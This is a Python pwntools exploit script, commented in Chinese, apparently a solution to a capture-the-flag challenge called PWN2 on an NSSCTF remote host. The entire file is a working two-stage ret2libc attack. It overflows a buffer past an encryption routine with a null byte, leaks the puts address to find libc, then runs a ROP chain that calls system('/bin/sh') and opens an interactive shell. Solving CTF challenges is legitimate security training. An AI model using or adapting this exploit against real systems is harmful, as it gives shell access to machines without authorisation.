from pwn import *
from LibcSearcher import LibcSearcher

context(os='linux', arch='amd64', log_level='debug')

e = ELF('./PWN2')
pop_rdi = 0x400c83  #带ret
ret     = 0x4006b9 
start   = e.symbols['_start']
puts_plt = e.plt['puts']
puts_got = e.got['puts']



# p = process('./PWN2')
p = remote('node5.anna.nssctf.cn',20781)

# 进菜单
p.recvuntil(b'choice!')
p.sendline(b'1')
p.recvuntil(b'encrypted')

# --------- 第一次 ROP：泄露 puts ---------
offset = 0x58  # 0x50 buffer + 8 saved rbp

# 用 \x00 截断 strlen，保护后面的 ROP 不被 XOR
payload  = b'A'*0x50 + b'\x00' + b'B'*7
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)
p.sendline(payload)

# 1. 吃掉 "Ciphertext\n"
p.recvuntil(b'Ciphertext\n')
# 2. 吃掉密文（被加密的那一大坨 ooooo....）
p.recvline()
# 3. 下一行就是 puts(puts_got) 打出来的泄露
leak = p.recvline().strip()
log.info(f"raw leak: {leak}")
puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f"puts addr: {hex(puts_addr)}")

# --------- 用 LibcSearcher 还原 libc base ---------
libc = LibcSearcher('puts', puts_addr)
libc_base   = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr  = libc_base + libc.dump('str_bin_sh')

log.success(f"libc base   = {hex(libc_base)}")
log.success(f"system      = {hex(system_addr)}")
log.success(f"/bin/sh     = {hex(binsh_addr)}")

# --------- 第二次 ROP：system("/bin/sh") ---------
p.recvuntil(b'choice!')
p.sendline(b'1')
p.recvuntil(b'encrypted')

payload2  = b'A'*0x50 + b'\x00' + b'B'*7
payload2 += p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)

p.sendline(payload2)
p.interactive()
